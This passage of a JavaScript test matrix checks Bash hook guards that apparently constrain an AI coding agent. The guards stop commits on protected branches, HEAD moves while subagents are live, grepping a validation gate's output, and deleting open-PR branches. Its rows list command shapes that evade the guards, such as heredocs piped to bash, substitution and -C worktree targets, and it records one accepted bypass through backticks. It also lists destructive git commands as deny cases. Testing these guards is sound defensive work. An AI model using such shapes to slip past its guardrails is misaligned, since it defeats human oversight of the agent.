  if (/\/issues\/comments/.test(ep)) out = [{ id: 901, issue_url: "u/issues/12", body: text(false) }];
  else if (/\/pulls\/comments/.test(ep)) out = [{ id: 902, pull_request_url: "u/pulls/13", body: text(false) }];
  else if (/\/pulls\/\d+\/reviews/.test(ep)) out = [{ id: 903, body: text(true) }];
  else if (/\/issues\?/.test(ep)) out = [{ number: 11, title: "an issue", body: text(false) }, { number: 13, title: "a pr", body: text(true), pull_request: {} }];
  else if (/\/releases/.test(ep)) out = [{ id: 21, name: "v0", tag_name: "v0", body: text(true) }];
  else if (/\/milestones/.test(ep)) out = [{ number: 3, title: "m", description: text(true) }];
  else if (/\/labels/.test(ep)) out = [{ id: 31, name: "l", description: "d" }];
  process.stdout.write(JSON.stringify(a.indexOf("--slurp") >= 0 ? [out] : out));
  process.exit(0);
}

function buildGhStub(root) {
  const bin = path.join(root, "gh-stub-bin");
  fs.mkdirSync(bin, { recursive: true });
  const exe = path.join(bin, process.platform === "win32" ? "gh.exe" : "gh");
  fs.copyFileSync(process.execPath, exe);
  const preload = path.join(bin, "gh-stub-preload.js");
  fs.writeFileSync(preload, GH_STUB_SRC);
  // FORWARD SLASHES, not path.sep. NODE_OPTIONS is parsed by node itself, which treats a backslash as
  // an escape inside the quoted value: a native path arrives as C:Users<user>AppData..., the require
  // throws before the guard's own script runs, and `2>/dev/null` eats the stack - so every stubbed row
  // reads as a silent ALLOW - the silent-failure shape one layer out.
  const auditPreload = path.join(bin, "gh-audit-preload.js");
  fs.writeFileSync(auditPreload, "(" + auditStub.toString() + ")();");
  const stub = { bin: bin, preload: preload.split(path.sep).join("/"), audit: auditPreload.split(path.sep).join("/") };
  // The fixture's own control. The stub is only useful if the guard's `gh` call actually reaches it,
  // and a stub that answers nothing is indistinguishable from an ALLOW verdict.
  // Exercise it through the same
  // bash -> node -> spawnSync("gh") path the guard uses, with the one mode that must come back loud.
  const probe = cp.spawnSync("bash", ["-c",
    "node -e \"const r=require('child_process').spawnSync('gh',['pr','list'],{encoding:'utf8'});" +
    "process.stdout.write(String(r.status)+'|'+(r.stdout||'')+'|'+(r.stderr||''))\""], {
    encoding: "utf8",
    env: Object.assign({}, ENV, {
      PATH: bin + path.delimiter + String(ENV.PATH || ""),
      NODE_OPTIONS: "--require \"" + stub.preload + "\"",
      GUARD_MATRIX_GH: "open",
    }),
  });
  if ((probe.stdout || "").indexOf("\"number\":74") < 0) {
    throw new Error("the gh stub does not answer through the production path (got: " +
      ((probe.stdout || "") + (probe.stderr || "")).slice(0, 300) + ") - every branch-delete row would " +
      "score a silent ALLOW for a reason that has nothing to do with the guard");
  }
  return stub;
}

function tearDown(root) {
  try {
    fs.rmSync(root, { recursive: true, force: true, maxRetries: 5 });
  } catch (e) {
    warn("could not remove fixture dir " + root + ": " + e.message);
  }
}

// ---------------------------------------------------------------------------------------------
// [3] The HEAD-freeze flag file
// ---------------------------------------------------------------------------------------------
// The guard reads os.tmpdir() from INSIDE the hook child. On this platform a child started through
// bash can resolve a different temp root than this process would, so the location is probed through
// the same bash -> node path rather than assumed - a flag written to the wrong directory turns every
// fresh-flag DENY row into a silent ALLOW that looks like a broken guard.
// SID is deliberately fake: writing a real session id here would raise a live-agent flag against a
// real session and freeze its HEAD.

const ENV = Object.assign({}, process.env);
// The guards fall back to CLAUDE_PROJECT_DIR when `cwd` resolves no repo. Left set, the REAL repo
// would answer for a fixture, so rows that must fail open (garbage stdin, no cwd) would pass for the
// wrong reason.
delete ENV.CLAUDE_PROJECT_DIR;
// the gh stub echoes GH_HOST, so an ambient one (a GHE user's export) would leak into every
// closing-echo row and red the matrix for the wrong reason - rows set it inline when they mean it.
delete ENV.GH_HOST;

const SID = "guard-matrix-fixture";
const FLAG_TTL_MIN = 120; // the guard's own TTL; the stale row sits one minute past it

function probeHookTmpdir() {
  const r = cp.spawnSync("bash", ["-c", "node -e \"process.stdout.write(require('os').tmpdir())\""],
    { encoding: "utf8", env: ENV });
  const t = (r.stdout || "").trim();
  if (!t) throw new Error("could not probe os.tmpdir() inside a bash-started node child");
  return t;
}

// `state` is "fresh" / "stale" / "none", or an object of agent id -> { wc: <fixture name>,
// isolated } describing where each live agent was SEEN. An entry with no `wc` is an agent that has not
// run Bash yet - the guard presumes it shares the main checkout. `wc` names are resolved to the
// fixture's path as the matrix built it (the short-name form on this host), while the guard stores
// realpaths - so the object rows also prove the guard compares normalised paths.
function setFlag(flagFile, state, repos) {
  if (state && typeof state === "object") {
    const agents = {};
    for (const id of Object.keys(state)) {
      const s = state[id];
      const en = { type: "developer", started: Date.now() };
      if (s.wc) { en.wc = repos[s.wc]; en.isolated = !!s.isolated; }
      agents[id] = en;
    }
    fs.writeFileSync(flagFile, JSON.stringify({ agents: agents }));
  } else if (state === "fresh" || state === "stale") {
    const started = state === "fresh" ? Date.now() : Date.now() - (FLAG_TTL_MIN + 1) * 60 * 1000;
    fs.writeFileSync(flagFile, JSON.stringify({ agents: { a1: { type: "developer", started: started } } }));
  } else {
    try { fs.unlinkSync(flagFile); } catch (e) { /* already absent - the "no flag" state */ }
  }
}

function readFlag(flagFile) {
  try { return JSON.parse(fs.readFileSync(flagFile, "utf8")); } catch (e) { return null; }
}

// Path equality the way the guard judges it: realpath (expands this host's 8.3 short names), and
// case-insensitive on Windows.
function samePath(a, b) {
  const rp = (p) => { try { return fs.realpathSync.native(p); } catch (e) { return path.resolve(p); } };
  const x = rp(a), y = rp(b);
  return process.platform === "win32" ? x.toLowerCase() === y.toLowerCase() : x === y;
}

// ---------------------------------------------------------------------------------------------
// [4] The fixture table
// ---------------------------------------------------------------------------------------------
// Every row states its own expected verdict for the CURRENT guards plus a one-line `note`: what
// would have to be wrong for this row to fail. A row that cannot answer that is decoration and does
// not belong here. Rows marked CONTROL are the ones that catch a guard which never ran at all.

const BT = String.fromCharCode(96); // backtick, kept out of the source text so it anchors nothing here
const ROWS = [];
const row = (o) => ROWS.push(o);
// Worktree rows name fixture PATHS in the command (git -C <worktree>), which exist only once [2] has built
// them - so `cmd` may be a function of the fixture map. Forward slashes, as an agent types them.
const fwd = (p) => p.split(path.sep).join("/");
const cmdOf = (r, repos) => (typeof r.cmd === "function" ? r.cmd(repos) : r.cmd);

// ---- commit-branch: real invocations on dev/main must DENY -----------------------------------
row({ id: "cb-d01", guard: "commit-branch", cwd: "dev", cmd: "git commit -m x", expect: "DENY",
  note: "CONTROL - fails if the guard never ran, the start-of-string anchor broke, or .git/HEAD stopped being read" });
row({ id: "cb-d02", guard: "commit-branch", cwd: "dev", cmd: "git -C . commit -m x", expect: "DENY",
  note: "fails if the {0,4} flag window between git and commit narrowed" });
row({ id: "cb-d03", guard: "commit-branch", cwd: "dev", cmd: "cd sub && git commit -m x", expect: "DENY",
  note: "fails if & left the anchor class" });
row({ id: "cb-d04", guard: "commit-branch", cwd: "dev", cmd: "echo a; git commit -m x", expect: "DENY",
  note: "fails if ; left the anchor class" });
row({ id: "cb-d05", guard: "commit-branch", cwd: "dev", cmd: "true || git commit -m x", expect: "DENY",
  note: "fails if | left the anchor class" });
row({ id: "cb-d06", guard: "commit-branch", cwd: "dev", cmd: "$(git commit -m x)", expect: "DENY",
  note: "fails if $( left the anchor class - the modern substitution stays covered though the backtick does not" });
row({ id: "cb-d07", guard: "commit-branch", cwd: "dev", cmd: "npm test" + NL + "git commit -m x", expect: "DENY",
  note: "fails if the newline anchor broke" });
row({ id: "cb-d08", guard: "commit-branch", cwd: "dev", cmd: "bash <<'EOF'" + NL + "git commit -m x" + NL + "EOF",
  expect: "DENY", note: "fails if the interpreter exemption misses bash and strips an EXECUTED heredoc body" });
row({ id: "cb-d09", guard: "commit-branch", cwd: "dev", cmd: "cat <<'EOF' | bash" + NL + "git commit -m x" + NL + "EOF",
  expect: "DENY", note: "fails if the exemption inspects only the word before << instead of the whole operator line" });
row({ id: "cb-d10", guard: "commit-branch", cwd: "dev", cmd: "pwsh -Command - <<'EOF'" + NL + "git commit -m x" + NL + "EOF",
  expect: "DENY", note: "fails if pwsh dropped out of the interpreter list" });
row({ id: "cb-d11", guard: "commit-branch", cwd: "main", cmd: "git commit -m x", expect: "DENY",
  note: "CONTROL - fails if the main half of the branch test broke (dev-only would still pass cb-d01)" });
row({ id: "cb-d12", guard: "commit-branch", cwd: "dev", cmd: "grep x <<< \"data\"" + NL + "git commit -m x",
  expect: "DENY", note: "fails if <<< is misread as a heredoc operator - the real commit line would be eaten as its body" });
row({ id: "cb-d13", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "prose about git commit here" + NL + "EOF" + NL + "git commit -m x",
  expect: "DENY", note: "fails if the body strip runs past the terminator line instead of stopping at it" });
row({ id: "cb-d14", guard: "commit-branch", cwd: "dev", cmd: "bash <<-EOF" + NL + "\tgit commit -m x" + NL + "\tEOF",
  expect: "DENY", note: "fails if <<- or a tab-indented terminator is mishandled while the body is still executed" });

// ---- commit-branch: prose and non-invocations must ALLOW --------------------------------------
row({ id: "cb-a01", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "Run " + BT + "git commit -a" + BT + " first." + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "the quoted-command false positive - fails if either half regressed (backtick out of the anchor class, or the body strip)" });
row({ id: "cb-a02", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<'EOF' && gh issue comment 5 --body-file f" + NL + "Run " + BT + "git commit -a" + BT + " first." + NL + "EOF",
  expect: "ALLOW", note: "same shape as bash actually parses it (&& on the operator line, EOF alone terminating)" });
row({ id: "cb-a03", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "Run " + BT + "git commit -a" + BT + " first." + NL + "EOF" + NL + "gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "same, as two statements - fails if the strip swallows the post-terminator command" });
row({ id: "cb-a04", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "Steps:" + NL + "```" + NL + "git commit -m x" + NL + "```" + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "fenced code block in a heredoc - only the body strip can allow this, the newline anchor fires otherwise" });
row({ id: "cb-a05", guard: "commit-branch", cwd: "dev",
  cmd: "gh issue create --body \"Git commit subjects follow the commit-subject key\"", expect: "ALLOW",
  note: "quoted-argument prose - fails if anchoring was lost entirely" });
row({ id: "cb-a06", guard: "commit-branch", cwd: "dev", cmd: "printf '%s' 'run git commit later'", expect: "ALLOW",
  note: "quoted-argument prose - fails if anchoring was lost entirely" });
row({ id: "cb-a07", guard: "commit-branch", cwd: "dev", cmd: "echo " + BT + "git commit -m x" + BT, expect: "ALLOW",
  note: "the accepted residual - fails if the backtick came back into the anchor class" });
row({ id: "cb-a08", guard: "commit-branch", cwd: "dev", cmd: "cat > f <<'EOF'" + NL + "git commit -m x", expect: "ALLOW",
  note: "unterminated data heredoc - fails if the body does not run to end-of-string" });
row({ id: "cb-a09", guard: "commit-branch", cwd: "dev",
  cmd: "cat > a <<'EOF'" + NL + "Run " + BT + "git commit -a" + BT + NL + "EOF" + NL + "cat > b <<'EOF'" + NL + "git commit -m x" + NL + "EOF",
  expect: "ALLOW", note: "fails if the heredoc scan stops after the first one and leaves the second body in" });
row({ id: "cb-a10", guard: "commit-branch", cwd: "dev",
  cmd: "cat > f <<-EOF" + NL + "\tRun " + BT + "git commit -a" + BT + " now" + NL + "\tEOF", expect: "ALLOW",
  note: "fails if <<- or a tab-indented terminator is not recognised on a DATA heredoc" });
row({ id: "cb-a11", guard: "commit-branch", cwd: "dev", cmd: "cat <<EOF" + NL + "git commit -m x" + NL + "EOF", expect: "ALLOW",
  note: "fails if an UNQUOTED delimiter is not recognised (cat prints its body, it does not execute it)" });
row({ id: "cb-a12", guard: "commit-branch", cwd: "feature", cmd: "git commit -m x", expect: "ALLOW",
  note: "fails if the dev/main branch test widened to every branch" });
row({ id: "cb-a13", guard: "commit-branch", cwd: "worktree", cmd: "git commit -m x", expect: "ALLOW",
  note: "linked worktree (.git is a FILE) on a FEATURE branch - fails if the gitdir: hop misreads its HEAD as dev/main " });
row({ id: "cb-a14", guard: "commit-branch", cwd: "dev", stdinShape: "garbage", cmd: "(garbage stdin)", expect: "ALLOW",
  note: "fail-open posture - fails if the try/catch around the JSON parse was lost" });
row({ id: "cb-a15", guard: "commit-branch", cwd: "dev", cmd: "git commitx -m x", expect: "ALLOW",
  note: "fails if the word boundary after commit was lost" });
row({ id: "cb-a16", guard: "commit-branch", cwd: "dev", cmd: "git status && git log", expect: "ALLOW",
  note: "fails if the verb list widened past commit" });
row({ id: "cb-a17", guard: "commit-branch", cwd: "dev", cmd: "echo hello world", expect: "ALLOW",
  note: "CONTROL - fails if the guard denies unconditionally" });

// ---- commit-branch: judge the working copy the commit TARGETS --------------------------
// Every DENY row below runs from a cwd on a FEATURE branch (or names the protected worktree only via
// -C), and every ALLOW row from a cwd on dev - so a guard that still judged the session checkout
// fails both halves, and one that still failed open in a linked worktree fails the DENY half.
row({ id: "cb-d15", guard: "commit-branch", cwd: "feature", cmd: (x) => "git -C " + fwd(x.wtdev) + " commit -m x",
  expect: "DENY", msg: "which is on dev",
  note: "-C names a linked worktree on dev while cwd is on a feature branch - fails if -C is ignored or the worktree's own HEAD is not read" });
row({ id: "cb-d16", guard: "commit-branch", cwd: "wtdev", cmd: "git commit -m x", expect: "DENY",
  note: "CONTROL for the closed fail-open - cwd inside a linked worktree on dev; fails if `.git` as a FILE still allows" });
row({ id: "cb-d17", guard: "commit-branch", cwd: "wtmain", cmd: "git commit -m x", expect: "DENY",
  note: "same, on main - fails if the gitdir: hop works for one protected branch only" });
row({ id: "cb-d18", guard: "commit-branch", cwd: "feature", cmd: "git -C ../wtdev commit -m x", expect: "DENY",
  note: "RELATIVE -C - fails if a relative target is not resolved against the hook cwd" });
row({ id: "cb-d19", guard: "commit-branch", cwd: "feature",
  cmd: (x) => "git -C " + fwd(x.worktree) + " commit -m a && git -C " + fwd(x.wtmain) + " commit -m b", expect: "DENY",
  note: "two commits, the SECOND on main - fails if only the first git...commit in the string is judged" });
if (process.platform === "win32") {
  row({ id: "cb-d20", guard: "commit-branch", cwd: "feature",
    cmd: (x) => "git -C " + fwd(x.wtdev).replace(/^([A-Za-z]):/, (m, d) => "/" + d.toLowerCase()) + " commit -m x",
    expect: "DENY", note: "a Git Bash /c/... path - fails if the MSYS drive form is not mapped (it would resolve to a nonexistent C:/c/... and fail open)" });
}
row({ id: "cb-d21", guard: "commit-branch", cwd: "feature",
  cmd: (x) => "git -C " + fwd(path.dirname(x.wtdev)) + "/GUARDM~1/../wtdev commit -m x", expect: "DENY",
  note: "a ~ INSIDE a -C path (a Windows 8.3 short name, e.g. a temp dir) - fails if any ~ reads as undecidable; only a LEADING ~ is shell expansion. Host-independent twin of the short-name paths the other -C rows happen to carry here" });
row({ id: "cb-a18", guard: "commit-branch", cwd: "dev", cmd: (x) => "git -C " + fwd(x.worktree) + " commit -m x",
  expect: "ALLOW", note: "the linked-worktree false positive itself (an integration worktree committed via -C from a dev checkout) - fails if the guard still judges the cwd" });
row({ id: "cb-a19", guard: "commit-branch", cwd: "dev", cmd: (x) => "git -C " + fwd(x.feature) + " commit -m x",
  expect: "ALLOW", note: "-C names a MAIN checkout on a feature branch - fails if -C is honoured for linked worktrees only" });
row({ id: "cb-a20", guard: "commit-branch", cwd: "dev", cmd: "git -C \"$WT\" commit -m x", expect: "ALLOW",
  note: "an unexpandable -C target - cannot decide, so fail-soft ALLOW; fails if it silently falls back to judging the dev cwd" });
row({ id: "cb-a21", guard: "commit-branch", cwd: "dev", cmd: "git -C no-such-dir commit -m x", expect: "ALLOW",
  note: "a nonexistent -C target (dev/no-such-dir) - fails if the walk-up from a missing path climbs into the dev repo around it" });

// ---- HEAD-freeze: a fresh live-agent flag must DENY HEAD moves --------------------------------
row({ id: "hf-d01", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "git checkout main", expect: "DENY",
  note: "CONTROL - fails if the guard never ran, the anchor broke, or the flag file is read from the wrong tmpdir" });
row({ id: "hf-d02", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "git -C . switch dev", expect: "DENY",
  note: "fails if the switch alternative or the {0,4} flag window broke (-C . since a -C target is now resolved, and a nonexistent one cannot be judged)" });
row({ id: "hf-d03", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "cd y && git reset --hard", expect: "DENY",
  note: "fails if & left the anchor class or reset left the verb list" });
row({ id: "hf-d04", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "git stash", expect: "DENY",
  note: "fails if the stash alternative broke" });
row({ id: "hf-d05", guard: "head-freeze", cwd: "dev", flag: "fresh",
  cmd: "bash <<'EOF'" + NL + "git checkout main" + NL + "EOF", expect: "DENY",
  note: "fails if THIS copy of the heredoc helper strips an executed body (each guard carries its own copy)" });

// ---- HEAD-freeze: prose, stale flag, no flag, other verbs must ALLOW --------------------------
row({ id: "hf-a01", guard: "head-freeze", cwd: "dev", flag: "fresh",
  cmd: "cat > f <<'EOF'" + NL + "Use " + BT + "git checkout" + BT + " sparingly." + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "the quoted-command shape on this guard - fails if this copy of the fix is missing" });
row({ id: "hf-a02", guard: "head-freeze", cwd: "dev", flag: "fresh",
  cmd: "cat > f <<'EOF'" + NL + "```" + NL + "git checkout main" + NL + "```" + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "fenced code block in a heredoc - only the body strip can allow this" });
row({ id: "hf-a03", guard: "head-freeze", cwd: "dev", flag: "stale", cmd: "git checkout main", expect: "ALLOW",
  note: "flag is one minute past the guard's 120-minute TTL - fails if the tuned TTL moved" });
row({ id: "hf-a04", guard: "head-freeze", cwd: "dev", flag: "none", cmd: "git checkout main", expect: "ALLOW",
  note: "no flag file at all - fails if the missing-file catch broke and the guard denied blind" });
row({ id: "hf-a05", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "git worktree add ../wt dev", expect: "ALLOW",
  note: "fails if the verb list widened - worktree add is the sanctioned way to work while HEAD is frozen" });
row({ id: "hf-a06", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: "git log", expect: "ALLOW",
  note: "CONTROL - fails if the guard denies unconditionally" });
row({ id: "hf-a07", guard: "head-freeze", cwd: "worktree", flag: "fresh", cmd: "git checkout main", expect: "ALLOW",
  note: "cwd in a linked worktree, the only agent not yet SEEN - fails if an unseen agent is presumed to share a linked worktree rather than the main checkout" });
row({ id: "hf-a08", guard: "head-freeze", cwd: "dev", flag: "fresh", stdinShape: "no-session", cmd: "git checkout main",
  expect: "ALLOW", note: "no session_id in the hook JSON - fails if the guard stopped requiring one before naming a flag file" });

// ---- HEAD-freeze: count only agents that share the TARGET working copy ------------------
// An agent's `wc` is where its own Bash cwd was seen (the guard marks it, rows hm-* below); an agent
// with no `wc` has not run Bash yet and is presumed to share the MAIN checkout. Both directions
// discriminate: a guard that still counted every live agent fails the ALLOW rows, and one that
// stopped counting the seen-in-main or seen-in-this-worktree agent fails the DENY rows.
row({ id: "hf-a09", guard: "head-freeze", cwd: "dev", flag: { a1: { wc: "worktree", isolated: true } },
  cmd: "git checkout main", expect: "ALLOW",
  note: "the linked-worktree false positive itself: the only live agent was seen in its own linked worktree - fails if isolation is ignored" });
row({ id: "hf-d06", guard: "head-freeze", cwd: "dev", flag: { a1: { wc: "dev", isolated: false } },
  cmd: "git checkout main", expect: "DENY",
  note: "an agent SEEN in the main checkout (and a realpath-vs-short-name pair) - fails if seen agents stopped counting or paths are compared raw" });
row({ id: "hf-d07", guard: "head-freeze", cwd: "dev", flag: { a1: { wc: "worktree", isolated: true }, a2: {} },
  cmd: "git checkout main", expect: "DENY", msg: "1 live agent(s)",
  note: "one isolated + one not-yet-seen agent - fails if the isolated one is counted too (2) or the unseen one is not (ALLOW)" });
row({ id: "hf-d08", guard: "head-freeze", cwd: "dev", flag: { a1: { wc: "worktree", isolated: true } },
  cmd: (x) => "git -C " + fwd(x.worktree) + " checkout x", expect: "DENY",
  note: "moving the HEAD of a live agent's OWN worktree (a linked target must be frozen too) - fails if a linked target is never frozen" });
row({ id: "hf-a10", guard: "head-freeze", cwd: "dev", flag: "fresh", cmd: (x) => "git -C " + fwd(x.worktree) + " checkout x",
  expect: "ALLOW", note: "-C another working copy while a not-yet-seen agent is presumed in main - fails if the target is not resolved from -C" });
row({ id: "hf-a11", guard: "head-freeze", cwd: "dev", flag: { a1: { wc: "dev", isolated: false } },
  cmd: (x) => "git -C " + fwd(x.worktree) + " checkout x", expect: "ALLOW",
  note: "-C another working copy while an agent is SEEN in main - fails if a seen agent freezes every working copy" });

// ---- HEAD-freeze: the marking step - an agent's Bash call records where it lives ---------
// `agent` puts agent_id in the hook JSON (PreToolUse carries it only for a subagent's call). `after`
// inspects the flag file once the hook returns: the verdict alone cannot see a record that was never
// written, which is the silent-failure shape this file exists to catch.
const wcIs = (name, isolated) => (f, x) => !!(f && f.agents && f.agents.a1 && f.agents.a1.isolated === isolated &&
  typeof f.agents.a1.wc === "string" && samePath(f.agents.a1.wc, x[name]));
row({ id: "hm-01", guard: "head-freeze", cwd: "worktree", agent: "a1", flag: { a1: {} }, cmd: "git status",
  expect: "ALLOW", after: { what: "a1 marked isolated at the worktree", check: wcIs("worktree", true) },
  note: "CONTROL - a subagent's call from a linked worktree must mark its entry, on a NON-HEAD-moving command too; fails if marking is dead" });
row({ id: "hm-02", guard: "head-freeze", cwd: "dev", agent: "a1", flag: { a1: {} }, cmd: "git status",
  expect: "ALLOW", after: { what: "a1 marked NOT isolated at dev", check: wcIs("dev", false) },
  note: "a call from the main checkout records that too - fails if every seen agent is marked isolated" });
row({ id: "hm-03", guard: "head-freeze", cwd: "worktree", agent: "zz", flag: { a1: {} }, cmd: "git status",
  expect: "ALLOW", after: { what: "no entry created for an agent that was never raised",
    check: (f) => !!(f && f.agents && !f.agents.zz && f.agents.a1 && !f.agents.a1.wc) },
  note: "an agent_id with no raised entry - fails if the mark step invents entries (it would freeze HEAD with no SubagentStop to lower it)" });
row({ id: "hm-04", guard: "head-freeze", cwd: "worktree", agent: "a1", flag: { a1: { wc: "worktree", isolated: true } },
  cmd: "git checkout -b other", expect: "ALLOW",
  note: "an isolated agent moving its OWN worktree's HEAD - fails if the caller freezes itself" });
row({ id: "hm-05", guard: "head-freeze", cwd: "worktree", agent: "a1",
  flag: { a1: { wc: "worktree", isolated: true }, a2: { wc: "worktree", isolated: true } },
  cmd: "git checkout -b other", expect: "DENY",
  note: "a SECOND agent seen in the same worktree - fails if self-exclusion widened to every agent in a linked worktree" });
row({ id: "hm-06", guard: "head-freeze", cwd: "dev", agent: "a1", flag: { a1: {} }, cmd: "git checkout main",
  expect: "DENY", after: { what: "a1 marked NOT isolated at dev", check: wcIs("dev", false) },
  note: "a non-isolated subagent moving the SHARED checkout still counts itself - fails if self-exclusion leaked into the main checkout" });

// ---- agent-raise: SubagentStart records a spawn already seen in a linked worktree --------
row({ id: "ar-01", guard: "agent-raise", cwd: "worktree", agent: "a1", flag: "none", cmd: "(SubagentStart)",
  expect: "ALLOW", after: { what: "a1 raised AND recorded isolated at the worktree", check: wcIs("worktree", true) },
  note: "CONTROL - a spawn whose cwd is a linked worktree; fails if the raise hook drops the cwd or never raises" });
row({ id: "ar-02", guard: "agent-raise", cwd: "dev", agent: "a1", flag: "none", cmd: "(SubagentStart)",
  expect: "ALLOW", after: { what: "a1 raised with NO wc (presumed in the main checkout)",
    check: (f) => !!(f && f.agents && f.agents.a1 && typeof f.agents.a1.started === "number" && !("wc" in f.agents.a1)) },
  note: "a spawn whose cwd is a main checkout - fails if it is recorded as seen (or isolated) before it ever ran Bash" });
row({ id: "ar-03", guard: "agent-raise", cwd: "worktree", agent: "a1", flag: { a2: { wc: "dev", isolated: false } },
  cmd: "(SubagentStart)", expect: "ALLOW",
  after: { what: "a2 kept beside the new a1", check: (f, x) => wcIs("worktree", true)(f, x) && !!f.agents.a2 && samePath(f.agents.a2.wc, x.dev) },
  note: "raising one agent must not clobber another's entry - fails if the read-modify-write lost the existing state" });

// ---- gate-verdict: piping the gate into a filter must DENY ------------------------------------
row({ id: "gv-d01", guard: "gate-verdict", cwd: "dev", cmd: "pwsh -NoProfile -File scripts/validate-local.ps1 | grep PASS",
  expect: "DENY", note: "CONTROL - the canonical shape; fails if the guard never ran" });
row({ id: "gv-d02", guard: "gate-verdict", cwd: "dev", cmd: "./scripts/validate-local.ps1 | Select-String FAIL",
  expect: "DENY", note: "fails if the bare-path script alternative or the Select-String filter alternative broke" });
row({ id: "gv-d03", guard: "gate-verdict", cwd: "dev", cmd: "pwsh -File scripts/validate-local.ps1 2>&1 | sls \"\\[3\\]\"",
  expect: "DENY", note: "fails if the gap's single-& tolerance broke and 2>&1 read as a command separator" });
row({ id: "gv-d04", guard: "gate-verdict", cwd: "dev", cmd: "powershell -File scripts/validate-local.ps1 | grep RESULT",
  expect: "DENY", note: "fails if the powershell (5.1) spelling dropped out of the interpreter alternative" });
row({ id: "gv-d05", guard: "gate-verdict", cwd: "dev",
  cmd: "bash <<'EOF'" + NL + "pwsh -File scripts/validate-local.ps1 | grep PASS" + NL + "EOF", expect: "DENY",
  note: "fails if the strip ignores the interpreter exemption in this copy and treats an executed body as prose" });

// ---- gate-verdict: the sanctioned reads must ALLOW --------------------------------------------
row({ id: "gv-a01", guard: "gate-verdict", cwd: "dev", cmd: "pwsh -NoProfile -File scripts/validate-local.ps1", expect: "ALLOW",
  note: "the sanctioned invocation (Project Facts test-cmd) - fails if the guard denies the bare run" });
row({ id: "gv-a02", guard: "gate-verdict", cwd: "dev", cmd: "pwsh -File scripts/validate-local.ps1 > out.txt; grep PASS out.txt",
  expect: "ALLOW", note: "the sanctioned workaround - fails if the gap stopped excluding ; and blocked redirect-then-grep-a-file" });
row({ id: "gv-a03", guard: "gate-verdict", cwd: "dev", cmd: "grep PASS out.txt", expect: "ALLOW",
  note: "fails if the guard stopped requiring the gate script in the pipeline and denied any grep" });
row({ id: "gv-a04", guard: "gate-verdict", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "Never run " + BT + "pwsh -File scripts/validate-local.ps1 | grep PASS" + BT + " - read the exit code." + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "the quoted-command shape on this guard - prose quoting the forbidden pipe must not deny" });
row({ id: "gv-a05", guard: "gate-verdict", cwd: "dev",
  cmd: "cat > f <<'EOF'" + NL + "pwsh -File scripts/validate-local.ps1 | grep PASS" + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "bare forbidden line inside a data heredoc - only the body strip can allow this" });
row({ id: "gv-a06", guard: "gate-verdict", cwd: "dev", cmd: "echo hello world", expect: "ALLOW",
  note: "CONTROL - fails if the guard denies unconditionally" });

// ---- branch-delete (SHIPPED): deleting an open PR's head must DENY -------
// Scored against hooks.json.
// Every row here pins `gh` to the stub (see buildGhStub) - a row that let the real gh answer would
// score the local open PRs, and would go green or red for reasons that have nothing to do with
// the guard. `msg` rows additionally require a substring of the guard's own text, which is how a
// verdict that is right for the wrong ref (unnormalised, or another row's ref) is caught.
row({ id: "bd-d01", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch -D feat/x", expect: "DENY",
  msg: "branch feat/x is the head of open PR #74",
  note: "CONTROL - fails if the guard never ran, the anchor broke, or gh stopped being consulted" });
row({ id: "bd-d02", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch --delete feat/x", expect: "DENY",
  note: "fails if the long --delete spelling dropped out" });
row({ id: "bd-d03", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch -Df feat/x", expect: "DENY",
  note: "fails if a COMBINED short flag stopped reading as a delete (-Df is how a forced delete is usually typed)" });
row({ id: "bd-d04", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git push origin --delete feat/x", expect: "DENY",
  msg: "branch feat/x is the head of open PR #74",
  note: "fails if the push --delete form is missed, or if the REMOTE is mistaken for the ref (origin would be looked up)" });
row({ id: "bd-d05", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git push origin :feat/x", expect: "DENY",
  msg: "branch feat/x is the head of open PR #74",
  note: "fails if the colon refspec delete form is missed, or if the leading colon is left on the ref" });
row({ id: "bd-d06", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch -D refs/heads/feat/x", expect: "DENY",
  msg: "branch feat/x is the head of open PR #74",
  note: "fails if refs/heads/ is not stripped - gh --head takes a branch name, so the unstripped ref answers []" });
row({ id: "bd-d07", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git -C . branch -D feat/x", expect: "DENY",
  note: "fails if git global flags (-C <dir>) stopped being skipped when locating the subcommand" });
row({ id: "bd-d08", guard: "branch-delete", cwd: "dev", gh: "open",
  cmd: "bash <<'EOF'" + NL + "git branch -D feat/x" + NL + "EOF", expect: "DENY",
  note: "fails if THIS copy of the heredoc helper strips an EXECUTED body (each guard carries its own copy)" });

// ---- branch-delete: everything else must ALLOW, and a blind gh must ALLOW LOUDLY ---------------
row({ id: "bd-a01", guard: "branch-delete", cwd: "dev", gh: "empty", cmd: "git branch -D feat/x", expect: "ALLOW",
  note: "no open PR has that head - the lane-cleanup path; fails if the guard denies on an empty gh answer" });
row({ id: "bd-a02", guard: "branch-delete", cwd: "dev", gh: "fail", cmd: "git branch -D feat/x", expect: "WARN",
  msg: "is BLIND and ALLOWED this delete",
  note: "gh exits 1 - fails if the guard denies on a gh failure (it must never) or stays silent about being blind" });
row({ id: "bd-a03", guard: "branch-delete", cwd: "dev", gh: "missing", cmd: "git branch -D feat/x", expect: "WARN",
